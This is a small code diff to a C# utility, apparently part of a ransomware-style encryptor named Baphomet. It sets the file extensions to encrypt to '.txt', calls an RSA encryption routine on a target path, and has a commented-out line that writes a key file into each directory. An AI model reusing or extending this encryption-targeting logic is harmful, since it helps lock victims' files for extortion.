@@ -28,7 +28,7 @@ namespace Baphomet.Utilities
         {
             CryptRSA cryptRSA = new CryptRSA();
 
-            var extensionCheck = new[] { "" };//Extensiones validas para cifrar
+            var extensionCheck = new[] { ".txt" };//Extensiones validas para cifrar
             cryptRSA.EncryptText(targetPath, key);
 
            // File.WriteAllText(targetPath + "\\yourkey.key", encryptedKey);//escribo la llave en cada uno de los directorios
